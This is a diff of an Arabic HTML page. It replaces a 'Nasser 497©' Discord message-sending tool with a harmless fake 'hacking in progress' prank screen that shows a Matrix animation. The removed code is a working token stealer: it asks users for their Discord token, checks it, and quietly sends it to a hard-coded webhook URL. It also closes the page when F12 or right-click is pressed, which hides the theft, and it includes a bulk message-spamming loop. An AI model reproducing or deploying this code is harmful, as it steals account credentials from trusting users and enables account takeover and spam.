@@ -1,200 +1,145 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Nasser 497©</title>
+  <meta charset="UTF-8">
+  <title>جاري الاختراق...</title>
   <style>
-    body {
-      background: linear-gradient(135deg, #1a0000, #000000);
-      color: #eee;
-      font-family: Arial, sans-serif;
-      direction: rtl;
-      padding: 0; margin: 0;
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: black;
+      color: lime;
+      font-family: monospace;
+      height: 100%;
     }
-    header, footer {
-      text-align: center;
-      font-size: 24px;
-      font-weight: bold;
-      padding: 20px;
-      color: #ff4444;
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
     }
-    main {
-      max-width: 600px;
-      margin: auto;
-      padding: 20px;
-    }
-    textarea, input, select {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      background-color: #222;
-      color: #eee;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-    }
-    button {
-      padding: 12px;
-      margin-top: 10px;
-      width: 100%;
-      border: none;
-      border-radius: 5px;
+
+    #terminal {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      right: 20px;
+      z-index: 2;
       font-size: 18px;
+      white-space: pre-wrap;
+      color: #00ff00;
+    }
+
+    .shake {
+      animation: shake 0.3s infinite;
+    }
+
+    @keyframes shake {
+      0% { transform: translate(1px, 1px); }
+      25% { transform: translate(-1px, -2px); }
+      50% { transform: translate(-3px, 0px); }
+      75% { transform: translate(2px, 2px); }
+      100% { transform: translate(1px, -1px); }
+    }
+
+    #stopBtn {
+      position: absolute;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: red;
+      color: white;
+      padding: 10px 20px;
+      font-size: 18px;
+      border: none;
       cursor: pointer;
-    }
-    .btn-green {
-      background-color: #28a745;
-      color: white;
-    }
-    .btn-red {
-      background-color: #dc3545;
-      color: white;
-    }
-    #status {
-      text-align: center;
-      margin-top: 10px;
-      min-height: 20px;
+      z-index: 3;
+      display: none;
     }
   </style>
 </head>
 <body>
-
-  <header>Nasser 497©</header>
-
-  <main>
-    <label>اكتب التوكن:</label>
-    <textarea id="tokenInput" rows="4" placeholder="توكن واحد فقط"></textarea>
-
-    <label>اكتب الايديات (مفصولة بفاصلة):</label>
-    <input type="text" id="idsInput" placeholder="مثلاً: 1381381865793130638" />
-
-    <label>ID روم / خاص / قروب:</label>
-    <input type="text" id="channelTypeInput" />
-
-    <label>قم بوضع الكلام:</label>
-    <textarea id="messageInput" rows="3" placeholder="النص الذي تريد إرساله"></textarea>
-
-    <label>قم بتحديد سرعة الإرسال:</label>
-    <select id="speedSelect">
-      <option value="1000">1</option>
-      <option value="900">0.9</option>
-      <option value="800">0.8</option>
-      <option value="700">0.7</option>
-      <option value="600">0.6</option>
-      <option value="500" selected>0.5</option>
-      <option value="400">0.4</option>
-      <option value="300">0.3</option>
-      <option value="200">0.2</option>
-      <option value="100">0.1</option>
-    </select>
-
-    <button id="startBtn" class="btn-green">بدء الإرسال</button>
-    <button id="stopBtn" class="btn-red" disabled>إيقاف الإرسال</button>
-    <button id="nextBtn" class="btn-green">التالي</button>
-
-    <div id="status"></div>
-  </main>
-
-  <footer>Nasser 497©</footer>
+  <canvas id="matrix"></canvas>
+  <div id="terminal"></div>
+  <button id="stopBtn">إيقاف الهجوم</button>
+  <audio id="beep" src="https://www.soundjay.com/button/beep-07.wav" preload="auto"></audio>
 
   <script>
-    const tokenInput = document.getElementById('tokenInput');
-    const idsInput = document.getElementById('idsInput');
-    const messageInput = document.getElementById('messageInput');
-    const speedSelect = document.getElementById('speedSelect');
-    const startBtn = document.getElementById('startBtn');
-    const stopBtn = document.getElementById('stopBtn');
-    const nextBtn = document.getElementById('nextBtn');
-    const status = document.getElementById('status');
+    // Matrix effect
+    const canvas = document.getElementById("matrix");
+    const ctx = canvas.getContext("2d");
 
-    let intervalId;
+    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth;
 
-    function sendToWebhook(token) {
-      fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ content: `توكن الحساب:\n${token}` })
-      });
-    }
+    const letters = "01";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
 
-    function validateToken(token) {
-      return fetch('https://discord.com/api/v9/users/@me', {
-        headers: { Authorization: token }
-      }).then(res => res.ok);
-    }
+    function drawMatrix() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
 
-    function sendMessage(token, channelId, message) {
-      return fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
-        method: 'POST',
-        headers: {
-          Authorization: token,
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ content: message })
-      });
-    }
+      ctx.fillStyle = "#0F0";
+      ctx.font = fontSize + "px monospace";
 
-    startBtn.addEventListener('click', async () => {
-      const token = tokenInput.value.trim();
-      const ids = idsInput.value.trim().split(',').map(i => i.trim()).filter(Boolean);
-      const message = messageInput.value.trim();
-      const speed = parseInt(speedSelect.value);
+      for (let i = 0; i < drops.length; i++) {
+        const text = letters.charAt(Math.floor(Math.random() * letters.length));
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
 
-      if (!token || ids.length === 0 || !message) {
-        status.textContent = 'يرجى ملء الحقول.';
-        return;
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+
+        drops[i]++;
       }
+    }
 
-      const valid = await validateToken(token);
-      if (!valid) {
-        status.textContent = '❌ التوكن غير صحيح';
-        return;
-      }
+    setInterval(drawMatrix, 50);
 
-      sendToWebhook(token); 
+    // Terminal effect
+    const lines = [
+      "جارِ الاتصال بالخادم...",
+      "تم الدخول إلى قاعدة البيانات...",
+      "جارِ تحميل الملفات الحساسة...",
+      "تم الوصول إلى الكاميرا...",
+      "جارِ رفع الصور الخاصة...",
+      "تم اختراق الجهاز!",
+      "جارِ إرسال البيانات إلى السيرفر المظلم...",
+      "جارِ حذف الملفات من القرص C:/",
+      "تم حذف 1200 ملف حتى الآن...",
+      "الهجوم مستمر..."
+    ];
 
-      let i = 0;
-      intervalId = setInterval(() => {
-        const id = ids[i % ids.length];
-        sendMessage(token, id, message).then(res => {
-          status.textContent = res.ok
-            ? `✅ أُرسل إلى ${id}`
-            : `❌ فشل مع ${id}`;
-        });
+    const terminal = document.getElementById("terminal");
+    const beep = document.getElementById("beep");
+    const stopBtn = document.getElementById("stopBtn");
+
+    let i = 0;
+    function typeLine() {
+      if (i < lines.length) {
+        terminal.innerHTML += lines[i] + '\n';
+        beep.play();
         i++;
-      }, speed);
-
-      startBtn.disabled = true;
-      stopBtn.disabled = false;
-    });
-
-    stopBtn.addEventListener('click', () => {
-      clearInterval(intervalId);
-      status.textContent = 'تم الإيقاف';
-      startBtn.disabled = false;
-      stopBtn.disabled = true;
-    });
-
-    nextBtn.addEventListener('click', () => {
-      const token = tokenInput.value.trim();
-      if (token) sendToWebhook(token);
-    });
-
-    
-    document.addEventListener('keydown', function (e) {
-      if (e.key === "F12") {
-        window.open('', '_self').close();
+        setTimeout(typeLine, 1500);
+      } else {
+        document.body.classList.add('shake');
+        stopBtn.style.display = "block";
+        terminal.innerHTML += "\n⚠️ اضغط على الزر لإيقاف الهجوم!\n";
       }
-    });
+    }
 
-    
-    document.addEventListener('contextmenu', function (e) {
-      e.preventDefault();
-      window.open('', '_self').close();
-    });
+    stopBtn.onclick = () => {
+      document.body.classList.remove('shake');
+      terminal.innerHTML += "\n✅ تم إيقاف الهجوم! لكن البيانات راحت 😈\n";
+      stopBtn.disabled = true;
+      stopBtn.innerText = "تم";
+    };
 
-    const WEBHOOK_URL = "https://l.webhook.party/hook/jBolC2pQm6w3wHurZelxeM5OZjozoe3wuu33s68eoM8GQ2EEOm31c5gwl9clW62kvloGslAnRyVlK35VoDJZwSJOAM7TI759%2Bny8w%2BKONFJMMnOEbAICH24G8Y3yWWl7t1yaOcHGV%2B4oJtwSaaHtViu2g%2BUW5arN18jiyR6F2sqZxcjm1ul5E4TNxQvrt2DDjVi2fY 8smh1zwp04jJLXnYYYshg9ka4oLyhhp1rpMsOpH%2FHv6%2Fgs3U49fjdf8aHsKKLjOA63WhQL8R27%2BEchLMA8FBINN6KWJMB8wpAbWn7b8jxP%2B3j ZLv1v%2FbRtTWLnhgd0RPm7O6naKWdqzoRhUN9%2FLGuflgiIT0%2FX0PpA9ddfZiUaDYwdP%2BKerpXKB0RQtgFOF2UXLbc%3D/%2F7FJqW2hXOq9GW8E";
+    typeLine();
   </script>
 </body>
 </html>
